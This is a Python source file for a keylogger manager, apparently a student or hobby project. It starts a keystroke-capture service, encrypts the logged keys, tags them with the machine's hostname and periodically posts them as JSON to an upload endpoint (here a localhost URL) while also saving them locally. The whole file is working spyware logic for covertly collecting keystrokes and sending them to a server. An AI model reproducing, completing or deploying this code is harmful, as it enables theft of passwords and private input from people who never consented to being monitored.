import socket
import json
import datetime
import time
from KeyService import KeyLoggerService
from FileWriter import FileWriter
from Encryptor import Encryptor
from NetworkWriter import NetworkWriter


class KeyLoggerManager:
    def __init__(self, secret_key):
        self.service = KeyLoggerService()
        self.file_writer = FileWriter()
        self.encryptor = Encryptor(secret_key)
        self.network_writer = NetworkWriter()
        self.data_dic = {}
        self.num_of_enter = 0

        # Get unique computer ID (hostname)
        self.computer_id = socket.gethostname()

    def run(self):
        self.service.start_logging()
        try:
            while self.service.running:
                time.sleep(2)
                self.add_to_dic()
                self.num_of_enter += 1
                if self.num_of_enter == 3:
                    self.save_locally()
                    self.num_of_enter = 0
        except KeyboardInterrupt:
            self.stop()
        except Exception as e:
            print(f"An error occurred: {e}")
            self.stop()

    def stop(self):
        self.service.stop_logging()
        print("KeyLogger stopped.")

    def add_to_dic(self):
        logged_keys = "".join(self.service.get_logged_keys())
        encrypted_data = self.encryptor.encrypt(logged_keys)
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Vérifier que encrypted_data est une chaîne avant de l'ajouter
        if encrypted_data is not None:
            self.data_dic[timestamp] = {"key_data": encrypted_data}
        else:
            print(f"Encrypted data is None for timestamp {timestamp}")
        self.service.buffer.flush()
        print(f"Added {len(logged_keys)} keys to the dictionary.")

    def save_locally(self):
        try:
            print(f"Data to send: {self.data_dic}")

            self.send_to_server()
            print(self.computer_id)
            self.file_writer.send_data(self.data_dic, None)
            print("Data saved locally.")
            self.data_dic = {}
        except Exception as e:
            print(f"Failed to save data locally: {e}")

    def send_to_server(self):
        """Send encrypted logs to the server with computer ID."""
        payload = {
            "computer_id": self.computer_id,
            "logs": self.data_dic
        }
        print(f"Payload: {payload}")

        json_data = json.dumps(payload, indent=4)
        print(type(json_data))
        self.network_writer.send_data(payload, "http://127.0.0.1:5000/upload")


if __name__ == "__main__":
    secret_key = "your_secure_secret_key"
    keyManager = KeyLoggerManager(secret_key)
    keyManager.run()
